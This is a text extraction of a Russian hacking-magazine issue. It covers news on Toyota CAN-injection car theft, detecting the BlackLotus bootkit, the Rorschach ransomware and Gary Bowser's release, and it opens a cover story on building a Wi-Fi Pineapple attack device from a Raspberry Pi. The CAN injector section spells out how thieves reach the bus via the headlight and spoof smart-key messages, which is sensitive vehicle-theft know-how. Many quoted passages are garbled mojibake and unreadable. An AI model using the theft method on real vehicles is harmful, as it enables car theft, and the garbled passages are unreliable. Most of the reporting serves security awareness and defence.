   какие-то подоз рения).
     Эта  история  началась  в  прош лом  году,  когда  владелец  Toyota
  RAV4 и ИБ-исследователь Иан Табор (Ian Tabor) заметил, что его машина
  получи ла стран ные повреждения переднего крыла, а корпус ее фары дважды
  за три месяца был частично разоб ран. Сначала Табор спи сал случив шееся
  на обычный вандализм, одна ко вскоре после это го машину угнали, а затем
  и его сосед обнаружил про пажу своего Toyota Land Cruiser.





  Табор стал сам рас следовать произошедшее и выявил новую схе му уго на
   авто без клю ча, о которой не зна ли ИБ-эксперты.
     Та бор начал с изучения данных телематичес кой системы MyT, которую
   Toyota исполь зует для отслеживания аномалий в работе своих транспортных
   средств, так называемых DTC (diagnostic trouble codes — диагностичес кие
  коды неисправностей). Выяснилось, что во вре мя угона его автомобиль
  зафиксировал множество DTC.
     Коды оши бок указывали на потерю связи между CAN-шиной (controller
   area network) и электрон ным блоком управле ния (ЭБУ) левой фары авто.
  Такие ЭБУ мож но найти практичес ки во всех современных авто мобилях, они
  используются для управле ния множеством функций, включая работу стек-
  лоочистителей, тормозов, фар и двигателя. Кроме того, ЭБУ регулярно
  передают статус-сообщения CAN, что бы держать другие ЭБУ в курсе текущей
   ситуации. Ниже показана схема CAN для RAV4.





  Ко ды DTC, указывающие на то, что левая фара RAV4 потеряла связь с CAN,
  не слиш ком удивили исследова теля, так как воры оборвали про водку. Более
  интерес ным Табору показался отказ многих других ЭБУ, произошед ший
  одновре менно, в том числе передних камер и управле ния гибридным дви-
   гателем. Все это сум марно свидетельствовало о том, что не ЭБУ вышли
  из строя, а что-то про изош ло с CAN-шиной.
    Иссле дователь стал искать объяснение и начал изучать информацию
  об уго нах авто на хакфорумах в даркнете и на YouTube. Вскоре он наткнул ся
  на рекламу устрой ств, пред лага ющих «emergency start» («аварийный запуск»),
   стоимостью 5500 долларов. Якобы такие устрой ства разработа ны, чтобы вла-
  дельцы авто и мастера по ремонту могли их использовать, когда нет ключа,
  однако их явно мож но было при менить и в дру гих целях.
    В ито ге Табор при обрел одно из таких устройств, обещавшее бесклю-
  чевой запуск дви гателя на раз личных моделях Lexus и Toyota (включая RAV4),
  и приступил к реверс-инжинирингу. На этом этапе он заручился поддержкой
  сво его друга и кол леги, эксперта по авто мобильной безопас ности и тех-
  нического дирек тора Canis Automotive Labs Кена Тин делла (Ken Tindell), чтобы
  разоб рать ся, что именно произошло с CAN-шиной его RAV4.
     Как расска зывают Тинделл и Табор, рань ше автоугонщики в основном
   устраивали ретрансляционные ата ки, то есть уси ливали сигнал между авто-
  мобилем и бре локом, который использует ся для его раз блокировки и запус-
   ка. Дело в том, что бре локи обычно работа ют толь ко на расстоянии несколь-
   ких мет ров от автомоби ля, но, помес тив рядом с машиной прос тое ради оус-
  тройство, угон щики уси ливают слабый сигнал, который посыла ют автомоби-
   ли.
    При дос таточном усилении такие сооб щения успешно достигают ближай-
  шего дома или офиса, где находится брелок. Ког да тот отвечает зашиф-
  рованным сообщением, которое должно отпе реть и запус тить двигатель
   авто моби ля,  ретран слятор переда ет  его машине. В  итоге преступник
  успешно уезжает на чужом авто.

         «Òåïåðü, êîãäà ëþäè çíà þò, êàê ðàáîòà þò ðåòðàíñëÿöèîííûå àòà êè,
        ìíîãèå âëà äåëüöû àâòîìîáèëåé äåð æàò ñâîè êëþ ÷è â ìåòàëëè÷åñ êèõ «
       ÿùèêàõ  (áëîêèðóÿ  ðàäèîñèãíàëû  îò  àâòîìîáèëÿ),  à  íåêîòîðûå
         àâòîïðîèçâîäèòå ëè âûïóñ êàþò êëþ ÷è, ïåðåõîäÿùèå â ñïÿùèé ðåæèì,
        åñëè íå äâèãàþòñÿ â òå÷åíèå íåñ êîëüêèõ ìèíóò, — ðàñ ñêà çûâà åò Òèí-
         äåëë. — Ñòîëêíóâ øèñü ñ ïîðàæå íèåì, íî íå æåëàÿ îòêà çûâàòüñÿ
         îò ïðèáûëüíîé äåÿòåëüíîñ òè, âîðû ïåðåø ëè ê íîâîìó ñïîñîáó îáõîäà
         ñèñ òåì áåçîïàñ íîñòè: îáõîäó âñåé ñèñ òåìû ñìàðò êëþ ÷åé â öåëîì.
        Îíè äåëà þò ýòî ñ ïîìîùüþ íîâîé àòà êè — CAN-èíúåêöèé».                 »
  Свои выводы иссле дова тели проиллюс трировали ко ротким видео с камеры
  наб людения, где атака с применением CAN-инъекций продемонстри рована
   в действии.
    Интересно,  что приобретенный Табором CAN-инжектор был замас-
  кирован под безобидную Bluetooth-колон ку JBL, видимо, чтобы угонщик
  не вызывал подозрений у про хожих или полиции. Также СМИ сообщали, что
  порой хакерские инструмен ты мас киру ют даже под старые Nokia 3310.
     Когда при обре тенное устрой ство вскры ли, ста ло оче видно, что это сов-
  сем не колонка.





                                        Продолжение статьи →
← Начало статьи

  Внутри корпуса скры вались ком поненты стоимостью око ло 10 дол ларов
  США, включая чип PIC18F, содержащий аппа ратное обеспечение CAN с про-
  шив кой, CAN-трансивер (стандартный CAN-чип, который превращает циф-
  ровые сигналы от CAN-железа на PIC18F в аналоговое напряжение, переда-
  ющееся CAN через проводку), а также дополнительную микросхе му, подклю-
  ченную к CAN-трансиверу.


         «Óñòðîéñòâî ïîëó÷à åò ïèòàíèå îò àêêó ìóëÿòîðà êîëîíêè è ïîäêëþ ÷àåò-
         ñÿ ê øèíå CAN. CAN-øèíà — ýòî íåñ êîëüêî ïðîâîäîâ, ñêðó ÷åííûõ «
        âìåñ òå, è â àâòîìîáèëå åñòü íåñ êîëüêî òàêèõ øèí, ëèáî ñîåäèíåííûõ
         íàï ðÿìóþ ñ ïîìîùüþ ðàçúåìîâ, ëèáî ïîäêëþ ÷åííûõ ÷åðåç êîìïü-
        þòåð øëþç, êîïèðó þùèé ÷àñòü ñîîáùåíèé CAN òóäà è îáðàòíî ìåæäó
        øèíàìè, ê êîòîðûì ïîäêëþ ÷åí, — îáúÿñíÿþò ñïå öèàëèñ òû. — Óñòðîé-
         ñòâî óãîíùèêîâ ïðåä íàçíà ÷åíî äëÿ ïîäêëþ ÷åíèÿ ê óïðàâëÿþùåé CAN-
        øèíå (êðàñ íûé öâåò íà ñõå ìå) äëÿ èìèòàöèè ÝÁÓ ñìàðò êëþ ÷à.
          Ñó ùåñ òâó åò íåñ êîëüêî ñïîñîáîâ äîáðàòüñÿ äî ïðîâîä êè ýòîé CAN-
        øèíû, è åäèíñ òâåííîå óñëîâèå, êîòîðîå íóæíî ñîáëþñòè: ïðîâîäà
        äîëæíû ïîäõîäèòü áëèç êî ê êîð ïóñó àâòîìîáèëÿ, ÷òîáû èõ ìîæíî áûëî
        äîñ òàòü (ïðîâîäà, çàêîïàííûå ãëó áîêî â àâòîìîáèëå, íåï ðàêòè÷ íû
         äëÿ âîðîâ, ïûòà þùèõñÿ óãíàòü ïðèïàð êîâàííûé íà óëèöå àâòîìîáèëü).
         Áåçóñ ëîâíî, ñàìûé ïðîñ òîé ïóòü ê ýòîé CAN-øèíå íà RAV4 ëåæèò
         ÷åðåç ôàðû. Íóæíî îòîäâèíóòü áàì ïåð è ïîëó÷èòü äîñ òóï ê CAN-øèíå
         ÷åðåç ðàçúåì ôàðû.
          Âîç ìîæåí è äðó ãîé ñïîñîá äîñ òóïà: ïðîäåëàòü îòâåð ñòèå â ïàíåëè,
         çà êîòîðîé ïðîõîäÿò ïðîâîäà CAN, ïåðåðå çàòü èõ è ïîä êëþ ÷èòü CAN-
         èíæåêòîð. Íî òàê êàê ñòîèìîñòü àâòîìîáèëÿ ñ äûð êîé ïàäà åò, âîðû
        îáû÷ íî âûáèðà þò áîëåå ïðîñ òîé ïóòü».                 »
  При первом включении CAN-инжектор не делает ничего: чтобы узнать
  о готов ности автомобиля, он ждет опре делен ного сооб щения от CAN.
  Получив его, он отправляет серию сообщений (при мерно 20 раз в секунду)
  и акти вирует дополнительную цепь, подклю ченную к CAN-трансиверу. Такие
  серии сообщений содер жат сиг нал о валид ности смарт-ключа, и шлюз
  передает этот сигнал ЭБУ управления двигателем.
    Иссле дователи отмечают, что обычно это провоцирует путани цу, так
   как CAN-сооб щения от нас тоящего кон трол лера смарт-ключа будут конфлик-
   товать с сообщениями CAN-инжектора, а это может помешать шлюзу
  передать сообщение-инжект. Здесь на помощь угонщикам приходит допол-
  нительная цепь, которая изменяет работу CAN-шины таким образом, что бы
  другие ЭБУ на этой шине не мог ли общаться меж ду собой.
     Кроме того, на корпусе фальшивой колон ки JBL есть кнопка Play, которая
  под клю чена к PIC18F. Когда эта кнопка нажата, поток сообщений CAN нем-
  ного меняется, и угон щики дают команду ЭБУ отпереть двери авто (как
  если бы была нажата кноп ка Open на смарт-клю че). Пос ле этого воры могут
  отсо единить CAN-инжектор, садиться в машину и уез жать.
     Та бор и Тинделл пишут, что разработали две воз можные схе мы защиты
   от CAN-инъекций и уве домили предста вителей Toyota о своих выводах, одна-
   ко пока не получи ли от ком пании никакого отве та. При этом экспертам уда-
  лось добить ся присвоения этой проб леме CVE-идентификатора CVE-2023-
  29389, связанного с Toyota RAV4.
    В отчете отмечается, что в сети можно найти аналогичные девайсы
  для взло ма и уго на, нацелен ные и на многие другие авто, включая BMW,
   Cadillac, Chrysler, Ford, GMC, Honda, Jaguar, Jeep, Maserati, Nissan, Peugeot,
   Renault и Volkswagen.


 ЗАБЛОКИРОВАНО 135 МИЛЛИОНОВ МОШЕННИЧЕСКИХ
 ЗВОНКОВ

   Роскомнадзор сообщил, что недавно заработав шая система «Антифрод», которая позволяет
   уси лить  контроль  за  вызовами  и  выявлять  под менные  номера,  заблокиро вала  более
   135 000 000 мошенничес ких вызовов.





  В нас тоящее время к системе под ключены четыре основных опе ратора связи («Мегафон»,
   «МТС», «Билайн» и Tele2). Под ключение к платформе бес плат но и воз можно в трех вариантах:
   облачное подклю чение, адаптация спе циального ПО на сервере опе ратора и аппаратное при-
   соединение сис темы свя зи опе ратора к узлу взаимодей ствия.


   По дан ным СМИ, за пропуск под менных номеров операторам уже приходят штрафы в размере
   примерно 500 000 руб лей.

 КАК ОБНАРУЖИТЬ
 BLACKLOTUS





  Компания Microsoft поделилась руководс твом, которое должно помочь орга-
  низациям обнаружить установку UEFI-буткита BlackLotus, экс плуатирующе го
   уязвимость CVE-2022-21894. Также в компании объ ясни ли, как лучше восста-
  нав ливать заражен ную систему.
     Впервые BlackLotus был замечен в октябре 2022 года. Его продавец
   утверждал, что бут кит имеет встроенный обход Secure Boot, встроенную
  защиту от удаления на уровне Ring 0 / ядра, а так же запускается в режиме
  вос становления и в безопасном режиме. Сооб щалось, что мал варь осна-
  щена антивир туализацией, антиотладкой и обфуска цией, что усложняет ее
  обнаружение и анализ. Также, согласно заявлениям продавца, защитное
  ПО не может обнаружить и унич тожить бут кит, так как тот запускает ся
  под учетной записью SYSTEM внут ри легитимного про цесса.
    Помимо это го, BlackLotus способен отключать защитные механизмы
  на целевых машинах, в том числе Hypervisor-Protected Code Integrity (HVCI)
  и Windows Defender, а также обходить User Account Control (UAC).
      BlackLotus име ет раз мер 80 Кбайт, написан на ассемблере и C и уме ет
  определять геозо ну жер твы, чтобы избегать зараже ния машин в странах СНГ.
  В прош лом году вре донос предлагался к про даже за 5000 долларов США,
  а каждая новая версия оценивалась еще в 200 долларов США.
     Позже угрозу удалось изучить аналити кам из компании ESET. Они под-
  твер дили, что буткит лег ко обходит Secure Boot и для закрепления в сис теме
  использует уязвимость CVE-2022-21894 годич ной давности.
    Подчеркивалось, что  Microsoft устра нила  эту проблему еще в янва-
  ре 2022 года, но зло умышленники по-прежнему могут исполь зовать ее, так
   как затронутые подписан ные бинарники не были добавлены в от зывной спи-
  сок UEFI. По сло вам аналитиков, BlackLotus — это первый задоку ментирован-
  ный случай злоупот ребления этой уязвимостью.
     Как теперь рассказали эксперты Microsoft, во время анализа устрой ств,
  ском про метированных с помощью BlackLotus, они выявили ряд особен-
   ностей, которые позволя ют обнаружить заражение. Исследователи говорят,
   что защитники могут искать признаки уста новки BlackLotus в сле дующих мес-
   тах:
   • недав но созданные и заб локированные фай лы загрузчика;
   • промежуточный каталог, используемый во время установки BlackLotus,
     в EFI System Partition (ESP);
   • из менение клю ча реестра Hypervisor-Protected Code Integrity (HVCI);
   • се тевые журналы;
   • журналы конфигурации заг рузки.





                           Из менения в реестре


         «Î÷åíü âàæíî îòìå òèòü, ÷òî èñïîëüçîâàíèå çëîóìûø ëåííèêàìè ýòîãî
         áóòêèòà â ïåð âóþ î÷å ðåäü ÿâëÿåòñÿ ìåõàíèç ìîì ñîõðàíåíèÿ è çàùèòû «
         îò óêëîíåíèÿ. Ýòî íå ïîëåç íàÿ íàãðóçêà ïåð âîãî ýòà ïà èëè âåê òîð
         íà÷àëüíîãî äîñ òóïà, áóòêèò ìîæíî ðàç âåðíóòü òîëüêî íà óñòðîéñòâå,
          ê êîòîðîìó çëîóìûø ëåííèê óæå ïîëó÷èë ëèáî ïðèâèëå ãèðîâàííûé,
        ëèáî ôèçè÷åñ êèé äîñ òóï», — ãîâîðèòñÿ â ñîîáùåíèè Microsoft.                 »
  Аналитики пишут, что BlackLotus блокиру ет фай лы, которые записы вает в EFI
   (ESP), делая их недос тупными. Однако их имена, время создания и сооб-
  щения об ошиб ке, полученные при попытке дос тупа к ним, должны сви детель-
   ствовать о наличии буткита, равно как и кастомный каталог (/system32/), соз-
  данный и не удаленный во время установки.

         «Åñëè â ESP óñòðîéñòâà îáíà ðóæèâàþòñÿ íåäàâ íî èçìå íåííûå è çàá-
         ëîêèðîâàííûå ôàéëû, îñîáåííî òå, êîòîðûå ñîîòâåòñ òâó þò èçâåñ òíûì «
        èìå íàì ôàéëîâ  çàãðóç÷èêà  BlackLotus,  èõ ñëå äóåò ðàñ ñìàòðèâàòü
          êàê  âåñüìà  ïîäîç ðèòåëüíûå.  Óñòðîéñòâî  íóæíî  óäà ëèòü  èç  ñåòè
         äëÿ ïðîâåð êè íà íàëè÷èå äîïîëíèòåëüíûõ äîêàçà òåëüñòâ ïðèñóòñ òâèÿ
          BlackLotus èëè ïîñ ëåäó þùèõ çà çàðàæå íèåì äåéñòâèé», — îòìå ÷àåò
          Microsoft.                 »
   Также защитники могут обнаружить определен ные изме нения в реестре, свя-
  занные с буткитом, записи журнала, соз данные, ког да BlackLotus отключает
   Microsoft Defender или добавляет компонен ты в цикл загрузки, и пос тоянное
  исхо дящее сетевое соединение winlogon.exe на порт 80, которое тоже ука-
  зывает на зараже ние.
     Для очистки машины, заражен ной BlackLotus, специалисты рекомендуют
  изолировать ее от сети, переформатировать и установить чистую ОС с раз-
  делом EFI или вос становить систему из чистой резер вной копии с раз делом
   EFI.
     Чтобы избе жать заражения BlackLotus или дру гим вре доносным ПО,
  использующим уязвимость CVE-2022-21894, Microsoft рекомендует организа-
  циям пом нить о принципе наименьших при виле гий и соб людать гиги ену учет-
  ных данных.


        «Èçáå ãàéòå èñïîëüçîâàíèÿ  ñëó æåáíûõ  ó÷åòíûõ çàïèñåé íà óðîâ íå
        äîìåíà è àäìèíèñ òðà òîðà. Îãðà íè÷å íèå ïðèâèëå ãèé ëîêàëüíîãî àäìè- «
        íèñ òðà òîðà ìîæåò ïîìî÷ü ïðå äîòâðà òèòü óñòà íîâ êó òðîÿíîâ óäà ëåí-
         íîãî äîñ òóïà (RAT) è äðó ãèõ íåæåëà òåëüíûõ ïðèëîæå íèé», — ãîâîðÿò
         â Microsoft.                 »

  НАЙДЕН САМЫЙ БЫСТРЫЙ ШИФРОВАЛЬЩИК
   Аналити ки Check Point обна ружили вымогательскую мал варь Rorschach, которая уже исполь-
   зовалась для атаки на неназванную аме риканскую компанию. Вредонос отличается крайне
   высокой ско ростью шифрования файлов, и Check Point называет эту угро зу «одной из самых
   быстрых программ-вымога телей», так как Rorschach работа ет даже быстрее, чем LockBit 3.0.


   Чтобы определить скорость шифрования Rorschach, экспер ты провели тест с использованием
  220 000 фай лов на машине с 6-ядерным процессором. Малвари потребовалось 4,5 минуты
   для шифрования данных, тог да как LockBit 3.0, до недавнего времени счи тавшийся самым быс-
   трым вымога телем, спра вил ся с той же задачей за 7 минут.

 РКН ЗАПУСТИЛ СВОЙ
 DOWNDETECTOR





  Заработал сервис «Мониторинг сбоев», созданный Центром мониторинга
  и управле ния сетью связи общего поль зования (ЦМУ ССОП) при под ведомс-
   твен ном Роскомнадзору ФГУП «Главный радиочастотный центр» (ГРЧЦ). Сер-
  вис был соз дан на замену Downdetector, из которого в прошлом году исчезли
  все российские ком пании и сер висы.


         «Åñëè âû ñòîëêíó ëèñü ñ ïðîáëåìîé â ðàáîòå èíòåðíåò ñåð âèñà, áàí-
         êîâ ñêîãî ïðèëîæå íèÿ èëè îïå ðàòîðà ñâÿçè, ìîæåòå ñîîáùèòü îá ýòîì «
         íà ïîð òàëå. Íà îñíîâå âñåõ îáðà ùåíèé ïîëüçîâàòå ëåé ôîð ìèðó åòñÿ
         òåï ëîâàÿ êàð òà. Åñëè ñáîé ìàñ ñîâûé, ñïå öèàëèñ òû Öåíòðà ïîä êëþ ÷àò-
         ñÿ ê ðåøåíèþ ïðîáëåìû ñîâ ìåñ òíî ñ îïå ðàòîðàìè ñâÿçè è âëà äåëü-
        öàìè ñåð âèñîâ», — ñîîáùàåò ÐÊÍ.                 »
  Как пишут пред ставители ЦМУ ССОП, сервис даст поль зователям воз-
  можность оставлять сооб щения о нерабо тос пособ ности интернет-сервисов,
  банковских при ложе ний и опе раторов свя зи, отслеживать стабильность их
  функционирования и изу чать географию зафиксированных проблем.
     Кроме того, на портале Центра был запущен спе циальный сервис для про-
  фильных спе циалистов — Looking Glass, который дает возможность получить
  информацию об IP-адресах, автономных системах и опти мальных маршру тах
   трафика.

        «Êëþ ÷åâàÿ  îñîáåííîñòü  ñåð âèñà —  èñïîëüçîâàíèå  ìàð øðóòíîé
        èíôîðìà öèè íåïîñ ðåäñ òâåííî îò âñåõ ðîñ ñèéñêèõ îïå ðàòîðîâ ñâÿçè «
         ïîñ ðåäñ òâîì èíôîðìà öèîííîé ñèñ òåìû ìîíèòîðèíãà Öåíòðà. Ýòî ïîç-
         âîëÿåò ïîëó÷àòü äîñ òîâåð íûå äàííûå î ìàð øðó òå íà èíòå ðåñó þùóþ
         ñåòü ñ òî÷ êè çðå íèÿ ëþáîãî ðîñ ñèéñêîãî îïå ðàòîðà», — ðàñ ñêà çàëè
         â ÃÐ×Ö, îòìå òèâ, ÷òî äàííûå ïðå äîñ òàâëÿþòñÿ â ðåæèìå ðåàëüíîãî
        âðå ìåíè.                 »





   Гла ва Google Сундар Пичаи заявил, что стрем ление к внедрению ИИ-технологий должно тща-
   тельно регулироваться, чтобы избежать потен циаль ных негативных последствий. По его сло-
   вам, ИИ может ока заться «крайне вредным при неправильном использовании».
     Одним из основных рисков Пичаи назвал всевозможные дип фейки — видео, изображения,
   аудио, где люди произносят фразы, которых они на самом деле не говорили.

            «Создание дипфейковых видео, которые наносят вред обществу, должно →         иметь пос ледствия. Любой, кто работал с ИИ какое-то время, понимает, что
          это неч то совершенно иное и настолько глубокое, что нам потребу ются спе-
          циальные соци альные нор мы, чтобы мы сумели придумать, как к этому адап-
          тировать ся»,


  — считает Сундар Пичаи.

 ГЭРИ БОУЗЕР
ВЫШЕЛ НА СВОБОДУ





  Бывший участник группы Team Xecuter, канадец Гэри «GaryOPA» Боузер (Gary
  Bowser) вышел на сво боду после шестнад цати месяцев тюрем ного зак-
  лючения. Однако Боузер по-прежнему должен выплатить Nintendo 14,5 мил-
  лиона долларов ком пенсации и, вероятно, будет платить компании до конца
  жизни.
    Напомню, что раньше Team Xecuter предлагала людям аппа ратные и прог-
  рам мные решения, позволявшие устанав ливать неофициальные и пиратские
  копии игр на кон солях (вклю чая популярную Nintendo Switch).
    Мы уже рассказывали, что в 2020 году Боузер был арес тован и в ито ге
  признал себя виновным. Дело в том, что в Team Xecuter он работал
  над линейкой SX OS для моддинга устрой ств Switch, а так же занимался раз-
  работ кой других инструментов, позволявших пользователям играть в пират-
  ские ROM.
    Боузер признал себя виновным по двум из одиннадцати пунктов обви-
   нения, связанных с торговлей устрой ства ми для обхода защиты и сговором
  с той же целью. Два этих обви нения вмес те пре дусматривали максимальное
  наказание в виде десяти лет лишения сво боды, но взамен на признание вины
  про куратура согласилась снять с Боузера остальные девять обви нений.
    В итоге моддер признал, что в период с июня 2013 года и вплоть до арес-
   та он «сознательно и умышленно участвовал в киберпреступной деятель ности
  по взло му ведущих игровых консолей, в рамках которой раз рабаты вались,
  про изводились и про давались раз личные устрой ства для обхода защиты,
  которые поз воляли клиентам (мод деров) играть в пиратские версии виде-
   оигр, защищенных авторским правом».
     Кроме того, Team Xecuter пытались «скрыть свою незаконную деятель-
   ность за предполагаемым желанием под держать доморощенных энтузиас-
   тов, которые стре мились разрабатывать собственные игры». Дело в том, что,
   хотя груп па поддерживала дви жение за право на ремонт, все же их про дукты
  позволяли пользовате лям играть в пират ские игры.
     Учитывая признание вины и тот факт, что Боузер согласился вып латить
  ком пании Nintendo 4 500 000 долларов, чтобы ком пенсировать часть убыт ков
   от деятельности Team Xecuter, в прошлом году суд отпра вил его за решетку
  на 40 месяцев (3 года и 4 месяца). Также по отдель ному гражданскому иску
  моддер согласился вып латить компании еще 10 миллионов долларов.
     Хо тя по офи циальной версии Team Xecuter нанесла Nintendo ущерб в раз-
  мере от 65 до 150 миллионов долларов, Боузер сообщал, что лично он
  зарабо тал лишь око ло 320 тысяч долларов за семь лет (получая прямые пла-
  тежи от Team Xecuter и долю с рекламных продаж на сайтах, которые он кон-
  тролиро вал).
     Как теперь сообщили СМИ, проведя шестнадцать месяцев в камере пред-
  варительного заключения и в итоге получив «скидку» за хорошее поведе ние,
  Боузер вышел из федеральной тюрьмы и теперь ожи дает возвра щения в род-
  ную Канаду.
    Боузер уже лично сооб щил о своем освобождении в иг ровом под касте
  NickMoses 05, где рассказал, что за время пребывания в тюрьме он уже
  «порабо тал» на Nintendo. Так, с момен та задер жания он вып латил ком-
  пании 175 дол ларов.
    Боузер говорит, что отныне Nintendo будет забирать от 25 до 30% его
  ежемесячного дохода и перед началом вып лат у него будет до шести
  месяцев. Раньше он работал бухгалтером, занимался ремонтом и консалтин-
   гом. В под касте Боузер высказал несколько идей о своей будущей работе.
   Так, медианная зар плата в Торонто, куда его, ско рее все го, отправят к семье,
  составляла 85 500 канадских долларов в год в 2020 году. Маловероят но, что
  моддер, которому уже за пятьдесят и который теперь имеет судимость, суме-
   ет накопить больше 14,5 миллиона дол ларов США для выплаты всех
  положенных компенсаций Nintendo.





   Поль зователь зас тавил ChatGPT генерировать ключи для Windows 95


   Власти Германии закрыли хакерский хостинг FlyHosting


   Western Digital взломали. Сервис My Cloud не работал неделю


   Ультразвуковая атака помогает взламывать голосовых помощников и умные устройства


   Microsoft и Fortra будут бороться со злоупотреблениями Cobalt Strike


   Google Pay по ошиб ке перечис лил деньги на сче та поль зователей


   Баг в чипах HiSilicon и Qualcomm превращает точки дос тупа в устройства для слежки


  С форума Kodi утек ли данные 400 000 пользователей


   Компании не очи щают сетевое обо рудование при про даже на вторич ном рынке


   Вредонос Goldoson проник в Google Play и набрал 100 мил лионов установок



   * Ïðèíàä ëåæèò êîì ïàíèè Meta, ÷üÿ äåÿòåëüíîñòü ïðèç íàíà ýêñ òðå ìèñò-

  ñêîé è çàï ðåùåíà â Ðîñ ñèè.
COVERSTORY





    СОБИРАЕМ И ПРИМЕНЯЕМ СВОЙ
               WI-FI PINEAPPLE




В филь мах порой можно уви деть, как ковар-
ный хакер с помощью небольшого кар-
манно го устройства размером с мобиль-
ный телефон  взла мывает беспровод ную
сеть какой-нибудь фирмы, проникает на ее               s0i37                                                                                   Lead cybersecurity analyst at
серверы и крадет пароли. Сегодня мы      USSC t.me/s0i37_channels0i37@ya.ru
прев ратимся в героя такого фильма и под-
робно разберем конс трук цию устройства
Pineapple,  обладающего  поистине  фан-
тастичес кими возможностями. Но самое
глав ное —  его можно собрать самос-
тоятельно, и мы подробно расскажем как.




                      Эта статья — часть серии пуб ликаций о прак-
                        тичес ких при емах взлома и атак с использовани-
                    ем под ручных устройств, которые мож но собрать
                       дома. В этих материалах мы рас крываем прос тые
                       спо собы получения несанкционированного дос-
                         тупа к защищенной информации и показываем,
                         как ее оградить от подобных атак. Предыду щая
                         статья серии: «Девайс-невидимка. Встра иваемся
                        в  локальную  сеть  с помощью  «невиди мого»
                        хакер ского устройства».




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


В пре дыдущих статьях рассматривались атаки, требующие пря мого дос тупа
к устройству. Теперь речь пойдет о других типах физических атак — по ради-
оканалу, то есть не требующих непосредс твен ного контакта с целями. А зна-
чит, эти атаки еще опас нее и зло умышленник становится еще незамет нее.
Ведь если физические атаки больше характерны для внутреннего наруши-
теля, прошедшего определенные рубежи кон троля, то физические атаки
с примене нием ради оволн используют внешние наруши тели, которые, воз-
можно, находятся где-то на рассто янии и действу ют через стены.
  Тем не менее это не полноценные уда ленные ата ки, проводи мые через
интернет. Такие  атаки  также требуют  от злоумышленника быть рядом
с целями, толь ко «рядом» здесь означает несколь ко десят ков или сотен мет-
ров. Сегодня беспроводные сети широко рас пространены, и со временем
отказ от про водов в пользу радиоинтерфей сов будет толь ко набирать обо-
роты. Главная причина — удобство. А в мире ИБ, как правило, что удобно, то
небезо пасно. Все беспроводное можно как минимум заглушить, если взло-
мать не получается.
   Тех нология Wi-Fi представляет для потен циального злоумышленни ка пер-
спективную поверхность для атак. Эта технология распростра нена пов семес-
тно, мак симально дос тупна и в то же время достаточ но разнообразна в плане
известных атак, прос тоте их исполнения и степени воз действия.
   Главная особен ность атак как на Wi-Fi, так и на радиосвязь в целом —
огра ниченный радиус действия. Для Wi-Fi такое ограниче ние сос тавляет 50–
100 м. И далеко не всегда принимаемый сиг нал позволя ет злоумышленнику
занять удобное место, чтобы расположить ся с ноутбуком. А некоторые атаки
и вовсе требуют, что бы сиг нал ата кующего устрой ства был лучше, чем
у легитим ного источника. Одна ко зло умышленник может собрать особое
устройство, которое позволит ему выпол нять ата ки везде, где необходимо,
выглядя при этом не так подозрительно, как на следующей картинке.





Часто атаки на беспро водные сети зависят от обстоятель ств (например,
наличия клиентов), поэтому их успешность определя ет еще и дли тельность.
Однако есть возможность сделать автономное мини атюрное устройство
и заранее запрограм мировать его на совер шение тех или иных атак или уда-
ленно управлять им так, что зло умышленник не будет обнаружен рядом с объ-
ектом и даже не попадет под объективы видеока мер. Такой девайс можно
незамет но под ложить вбли зи целей. Мы рассмотрим при мер такого устрой-
ства. По сути, это аналог известного готового решения Pineapple — аппарат-
ной платформы, которая реали зует атаки на бес провод ные сети.
  Во обще, попытка проникновения «по воз духу» — это не прос то атака «в
лоб», которую легко мож но заметить по характерно му имени. Зачастую ком-
пании делают множество дополнительных беспроводных сетей для разных
целей: гос тевую, корпоративную, технологи ческую, сеть для VIP-клиентов
и прочие. Не сто ит забывать про тестовые и раз нооб разные несанкциони-
рованные беспро водные  сети. Если компания име ет стро гую политику
безопасности и зап рещает выход в интернет, то количество несанкци они-
рованных «самопальных» беспровод ных сетей, раздаваемых самими сот-
рудни ками, как правило, велико. Так что, если беспроводная инфраструктура
похожа на опи санную, для злоумыш ленника атаки на сети Wi-Fi такой ком-
пании имеют боль шие шансы на успех, хоть и связаны с обширным перечнем
про верок.


ÐÅÀËÈÇÀÖÈß

Зло умыш ленни ку вовсе не обязательно при обретать готовые дорогостоящие
решения, он может собрать нуж ное устройство самос тоятельно. На самом
деле нет ничего слож ного в том, что бы в эру изо билия одноплатных компь-
ютеров изго товить небольшое устрой ство, которое можно максимально гиб-
ко настраивать.
  Основные  тре бования  к  подоб ному  устройству —  мини атюрность,
дешевизна, доступность компонентов и простота сборки. Наиболее удачным
решени ем может быть Raspberry Pi Zero W — один из немногих широко
известных одноплатных микрокомпь ютеров, встроенный Wi-Fi-чип которого
под держивает режимы работы, необходимые для подавляюще го количества
атак. И в ито ге мож но перейти от того, что представлено на сле дующем
рисунке, к чему-то менее замет ному.





     Аппаратное решение для атак на беспроводные сети (приметное)





    Аппаратное решение для атак на беспро водные сети (неп риметное)

А насколько собс твен ное решение может быть меньше готового, вид но
на сле дующем рисунке.





                    Почувствуйте разницу

Зло умыш ленник, конечно же, может пойти по пути наименьшего сопротив-
ления и взять готовое решение. Но, учи тывая то, что спе цифи ка атаки пред-
полага ет оставлять устрой ство в неконтро лиру емой зоне, оно становится
в некоторой степени расходным материалом, причем весьма недеше вым.
К тому же миниатюрное устрой ство про ще спря тать или даже поместить
на дрон (об этом я расска жу в следующей статье). На мой взгляд, выбор
под описываемые области при менения тут очевиден: если устройство про-
падет, зло умышленник просто купит еще один Raspberry и прошь ет заготов-
ленный образ на кар ту памяти, а не ста нет при обре тать дорогое готовое
решение и ждать, кого его доставят.
   Raspberry, как и боль шинс тво дру гих одноплат ных компьютеров, может
работать на пониженном напряжении, что позволяет использовать с ним
популярные компак тные аккумуляторы с нап ряжением 3,7 В. Такие аккумуля-
торы дешев ле и меньше, чем powerbank, и их можно легко купить в специали-
зированных магазинах. Заряжаются же они напряжением 5 В, которые можно
взять от любого USB.
  Правда, несмотря на то, что Raspberry Pi умеет работать от 3,3 В, внешние
USB-устройства не получают при этом обещан ные им USB-стандартом 5 В.
Поэтому, если планируется использовать такие внешние USB-устройства,
при дется все-таки поднять напряжение до 5 В через популярную плату DC-
DC MT3608. В результате можно получить минимальную конфигурацию
такого аппаратного решения, представленную на следующем рисунке.





                        Pineapple в соб ранном виде

